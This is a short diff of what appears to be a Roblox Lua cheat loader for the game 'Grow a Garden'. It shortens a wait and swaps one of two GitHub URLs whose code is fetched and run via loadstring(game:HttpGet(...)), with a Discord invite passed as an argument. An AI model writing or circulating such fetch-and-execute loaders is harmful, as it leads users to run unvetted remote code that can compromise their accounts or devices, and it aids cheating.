@@ -2,7 +2,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2"))()
 
 -- Wait 10 seconds before running the second
-task.wait(10)
+task.wait(5)
 
 -- Second script execution
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/spawnerpets", true))("discord.gg/csxu2nCkw9")
